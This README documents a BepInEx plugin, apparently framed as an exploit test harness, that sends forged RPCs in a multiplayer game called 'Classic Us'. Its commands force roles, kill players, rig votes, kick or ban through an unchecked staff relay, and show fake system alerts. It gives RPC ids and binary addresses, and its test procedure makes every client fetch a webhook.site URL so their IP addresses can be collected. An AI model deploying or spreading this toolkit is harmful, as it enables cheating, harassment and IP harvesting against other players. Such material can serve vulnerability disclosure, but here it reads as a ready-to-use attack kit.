# Classic Us exploit test harness (v1.8.2)

BepInEx 6 (IL2CPP) plugin that fires **forged broadcast RPCs** from a normal
(non-staff, non-host) game instance. Commands run on **hotkeys** (F6–F12)
intercepted via Harmony postfixes on per-frame public game methods
(`LobbyBehaviour.Update` / `PlayerControl.FixedUpdate`) — **no chat hook, no
injected il2cpp types** (both of those crash this build, see below).

The host/victim copy stays **100% stock**.

## Keys

| key | action |
|---|---|
| F6 | revive self (RPC 97 staff-action relay `revive`, needs a stock host) |
| F7 | revive + become impostor combo |
| F9 | `/ximpostor` — RPC 21 `SetRole("ImpostorRole")` on yourself |
| F10 | crew-vent in — nearest-vent SnapTo + PlayerPhysics RPC 0 `EnterVent` |
| F11 | exit vent (PlayerPhysics RPC 1) |
| F12 | cycle map (ShipHolder RPC 30 `SetShip`: Skeld→Mira→Polus→Airship→Submerged→Backrooms) |

> **v1.8.2 safety gate:** every RPC sender refuses to fire unless the game is
> actually inside a networked room (`AmongUsClient.Instance` + `GameData.Instance`
> + `LocalPlayer` all present). Pressing F9 in the main menu / disconnected now
> logs `NOT in a room` instead of aborting — `StartRpc` raises natively when
> there's no stream, and an il2cpp exception escaping a Harmony detour surfaces
> as the `PAL_SEHException` hard-abort that killed earlier builds.

## Install (attacker copy only — Linux, game 2026.9.5)

```bash
# attacker game folder:
unzip BepInEx-Unity.IL2CPP-linux-x64-6.0.0-be.788.zip
mkdir -p BepInEx/plugins
cp SystemAlertSpoof.dll BepInEx/plugins/
cp auad_relay_actions.txt BepInEx/config/   # optional — auto-created on first run
./run_bepinex.sh ./classicus2026.9.5linux.x86_64
```

First launch is slow (interop generation). Confirm in `BepInEx/LogOutput.log`:

```
[Harness] loaded v1.8.2 (hotkeys: F6 revive / F7 revive+impostor / F9 impostor / F10 vent / F11 exit / F12 map ...)
[Message:   BepInEx] Chainloader startup complete
```

> v1.7 is **chat-only by design**. The v1.5/v1.6 F7 console registered its own
> MonoBehaviour through `ClassInjector.RegisterTypeInIl2Cpp`, and that call
> segfaults on this Unity 2022.3 IL2CPP build even when deferred to the first
> lobby load (the BepInEx #474 `Class::Init` exhaustion: "Registered mono type
> ..." then instant crash). Harmony patches need no injected types, so the
> chat surface is the one that actually boots. Verified clean on a headless
> VPS: `Chainloader startup complete`, no `Class::Init` warning, no segfault.

> **If you see `PAL_SEHException` / `segmentation fault` / a crash with
> `Class::Init signatures have been exhausted, using a substitute!`** in the
> log — that is the known **BepInEx issue #474**: on Unity 2021.2+ IL2CPP
> games the Unity log listener exhausts Il2CppInterop's Class::Init signature
> pool and the game crashes shortly after. The documented workaround is to
> turn the Unity log listener OFF while keeping interop preload ON:
>
> ```ini
> [IL2CPP]
> PreloadIL2CPPInteropAssemblies = true   # keep this TRUE
>
> [Logging]
> UnityLogListening = false               # <- the fix (issue #474)
> ```
>
> History: an early experiment set BOTH keys to `false` and startup got
> worse (`PAL_SEHException` right after chainloader init) — that was
> `PreloadIL2CPPInteropAssemblies = false` breaking things, and it wrongly
> tarred `UnityLogListening`. Restoring both to stock `true` still crashed
> (the #474 Class::Init crash) until `UnityLogListening = false` alone was
> applied. v1.7 avoids the whole class of crash by never registering an
> injected type (the F7 console was removed; see above).
>
> Still crashing after that? Do a **clean reinstall**: `rm -rf BepInEx dotnet
> libdoorstop.so run_bepinex.sh .doorstop_version`, unzip be.788 fresh, drop
> the DLL back in, then re-apply `UnityLogListening = false`.

## Commands (chat on the ATTACKER instance)

### v1.4 — broadcast/staff-relay family

| command | RPC | what the stock host does |
|---|---|---|
| `/xalert <msg>` | 13 | pops a fake **SYSTEM ALERT** on every client |
| `/xaudio <url-or-tag>` | 94 | every client HTTP-fetches + plays the URL (IP harvest) |
| `/xmusic <url-or-tag>` | 89 | every client HTTP-fetches + plays the URL |
| `/xstop` | 95 | stops custom sounds |
| `/xrelay <action> [args...]` | 97 | **host executes any staff GameAction**, no staff check |
| `/xlist [filter]` | — | lists the actions loaded from the config |
| `/xreload` | — | re-reads `BepInEx/config/auad_relay_actions.txt` |

### v1.5 — pass-2 object-dispatcher vectors (exploits #9-#17)

| command | RPC | what the stock host/peers do |
|---|---|---|
| `/xplayers` / `/xwhoami` | — | list targets + net-ids (use the ids in the rest) |
| `/xclose` | MeetingHud 0 | force-close the active meeting |
| `/xcast <src> <suspect>` | MeetingHud 1 | stuff a vote as `<src>` for `<suspect>` |
| `/xrig <pid\|skip> [tie]` | MeetingHud 3 | force the meeting result — exile `<pid>` (or skip), votes don't matter |
| `/xwin <pid...>` | ShipStatus 2 | declare `<pid...>` the winners mid-round (via ShipHolder) |
| `/xmap <name>` | ShipHolder 30 | swap the active map (registry-validated names) |
| `/xsnap <pid> [x y]` | CNT 21 | teleport `<pid>` (default: onto you) |
| `/xfreeze <pid>` | CNT 21 | freeze `<pid>` — sid 0xFFFE poisons later legit snaps |
| `/xtasks <pid>` | GameData 29 | clear `<pid>`'s task list on the authority |
| `/xstart <secs>` | LobbyBehaviour 71 | force the lobby start countdown |
| `/xvent <pid>` | PlayerPhysics 0 | shove `<pid>` into the first vent in the scene |

### v1.7 — any-player gameplay vectors (exploits #20-#22)

| command | RPC | what happens |
|---|---|---|
| `/xrole <name> [pid]` | PlayerControl 21 | force `<name>` onto any player — host-side + every client, no gate. **`/ximpostor`** (= `ImpostorRole`) is the 100%-impostor hack; `/xcrew` = `CrewmateRole`. Role flips stick (nothing re-asserts mid-round) |
| `/xenter [ventId]` | PlayerPhysics 0 | **vent as crew** — self EnterVent; receive side never checks CanVent. No id = snaps you onto the nearest vent first (CNT 21), then enters |
| `/xexit [ventId]` | PlayerPhysics 1 | leave the vent |
| `/xkill <victim> [killer]` | PlayerControl 12 | **direct murder** — the CheckMurder (RPC 23) role/range/cooldown validation is skipped; payload is the victim's netId exactly like the host's legit broadcast |

Wire layouts verified in the 9.5 binary (case 21 reads a role-name string,
case 12 reads a net object, PlayerPhysics 0/1 read a packed vent id — none
have sender/role gates). `killer` defaults to your own player (you don't need
impostor for the RPC to apply).

`player id` is the byte id from `/xplayers` (0-99), or `me`. Multi-word values
can be quoted: `/xrelay alert "hello everyone"`. Commands are consumed locally
(never sent as chat).

### Long URLs don't fit in the chat box — use url aliases

The in-game chat input can't hold full links, so `/xaudio` and `/xmusic` also
accept a **short tag** looked up in the same config file. Open
`BepInEx/config/auad_relay_actions.txt` in a text editor and add a line:

```
url.sound = https://webhook.site/<token>/pwn.mp3
url.music = https://example.com/track.mp3
```

Then in chat just type:

```
/xaudio sound
/xmusic music
```

A full `http(s)://...` URL still works directly if you can type it; anything
else is treated as a `url.<tag>` lookup. The config is re-read on every `/x`
command, so no restart or `/xreload` needed after editing.

## /xrelay — the config file

`/xrelay` maps a command name to a `StaffTools.GameAction` numeric id using
`BepInEx/config/auad_relay_actions.txt` (auto-written on first run with the
full catalog — **321 actions**, generated from the decompiled enum). Lines:

```
# comment
name = id
```

Examples from the stock staff feature set:

```
kick = 0            ban = 1            disconnect = 2
alert = 38          announce = 39      countdown = 46
force_start_game = 94                  kill_all = 78
```

Usage: `/xrelay kick <playerName>` → RPC 97 → the **host** kicks that player.
`/xrelay alert hello world` → host shows a SYSTEM ALERT to the room.

How it works (verified in the 9.5 binary): the game's legit path is
staff console → `RelayToHost()` (@0x119d730) which sends
`StartRpc(netId, 97, Reliable) + Write(int32 action) + Write(string) +
Write(byte argc) + Write(string)*argc`. The receiver `HandleStaffHostActionRelayRpc`
(@0x119da90) only checks `AmHost`, then calls `Dispatch(action, args)` directly —
**no staff/role validation**. So any room member can make the host run any of
the 321 actions (kick, ban, teleport, god mode, force end-game, every
`/troll_*`, …). Test it with `/xrelay alert hello` first — if the stock host
shows the alert, the full 321-action relay is open.

## Test procedure — prove exploit #8 (remote-audio / IP harvest)

1. **Get a URL listener.** Open https://webhook.site → copy your unique
   `https://webhook.site/<token>` URL. (Any URL you control that logs HTTP
   requests works — the point is you see each victim's IP hit it.)
2. Stock copy = host → create a **private lobby**.
3. Attacker copy (BepInEx + this plugin) → join that lobby.
4. Put the URL in the config (see "url aliases" above) and in the attacker's
   chat type only:

   ```
   /xaudio sound
   ```

5. Open your webhook.site page.
   **Expected if the hole is real:** HTTP GET entries for `/pwn.mp3` — one from
   the stock host's IP (and your attacker IP), arriving within seconds of the
   command. That is the IP-harvesting proof: an attacker-chosen URL was fetched
   by every client in the room, and nobody had to click anything.

   Same test with `/xmusic ...` (RPC 89) and `/xstop` (RPC 95).

## Also testable with the same setup

- `/xalert <text>` → RPC 13 fake SYSTEM ALERT popups land on the stock host.
- `/xrelay kick <hostName>` → RPC 97 forces the *host* to kick someone — the
  original "I got kicked as host" symptom, reproduced without staff.
- `/xrelay disconnect <playerName>` → server-msg-style forced disconnect family.

## FPS notes (boot.config / launch env)

The `[UnityMemory]` dump at startup is just Unity printing its *defaults* —
`boot.config` memory keys only change RAM usage, not FPS. Real levers, best
first:

1. **In-game settings** — this build has `MUQualitySettings` presets
   (Low / NormalLowLoad / Normal / High / Ultra). Lowest preset + lower
   resolution = the big wins; there is no vsync/fps-cap boot.config key.
2. **`gamemoderun`** (Feral GameMode) — you already launch with it; that is
   the correct tool on Linux.
3. `boot.config` next to the executable: `gfx-disable-mt-rendering=1` helps
   on weak CPUs where the render thread overhead dominates (and hurts on
   others — test both). `gfx-enable-gfx-jobs=1` is default-on already.
4. If FPS is still terrible (e.g. a run "took 28 minutes"), check you are on a
   real GPU: `glxinfo -B | grep renderer`. `llvmpipe` (software) means no
   config tweak will save you.

## Troubleshooting

- `Class::Init signatures have been exhausted` + `PAL_SEHException`/segfault
  → set `UnityLogListening = false` in `BepInEx/config/BepInEx.cfg` and keep
  `PreloadIL2CPPInteropAssemblies = true` (issue #474 — see above). If that
  still crashes, clean-reinstall BepInEx (see above) and re-apply the key.
- Deleting `BepInEx/config/BepInEx.cfg` regenerates stock defaults — but stock
  `UnityLogListening = true` is exactly the #474 crash trigger on this game,
  so re-set it to `false` after.
- `Reference assemblies should not be loaded for execution` = wrong dll was
  copied (the `obj/Release/ref/` stub). Use `dist/SystemAlertSpoof.dll`
  (built from `bin/Release/`, real implementation).
- Crash/freeze **while sending a command** with an abort mentioning
  `PAL_SEHException`: v1.4 logs the managed seed if it is ours. Send the last
  ~100 lines of `BepInEx/LogOutput.log` (look for `UNHANDLED exception` /
  `first-chance exception in harness code`). To isolate whether it is the
  plugin at all: temporarily move `SystemAlertSpoof.dll` out of
  `BepInEx/plugins/` and repeat — stock+BepInEx must boot clean before the
  harness can be blamed.
- Abort right AFTER `Chainloader startup complete` (before reaching the menu):
  1. Move `SystemAlertSpoof.dll` out of `BepInEx/plugins/` and boot. Still
     crashes → BepInEx core + this game, not the plugin. Do a **clean
     reinstall** (unzipping the nightly over an old pre.2 install leaves stale
     mixed `BepInEx/core` files):
     `rm -rf BepInEx dotnet libdoorstop.so run_bepinex.sh .doorstop_version`
     then unzip `be.788` fresh, re-copy the plugin, boot. Zero-plugin clean
     boot still crashing = BepInEx 6 incompatible with this game on this
     machine → use the packet-level sender plan (no BepInEx at all).
  2. Boots clean without the plugin → the SendChat Harmony patch is implicated
     even before first use; a no-patch variant of the harness is the next build.
- Headless VPS note: BepInEx + game can abort at startup under Xvfb/llvmpipe on
  a headless VPS (environment-specific; unrelated to this plugin). Run the test
  on a desktop session where the game normally runs.
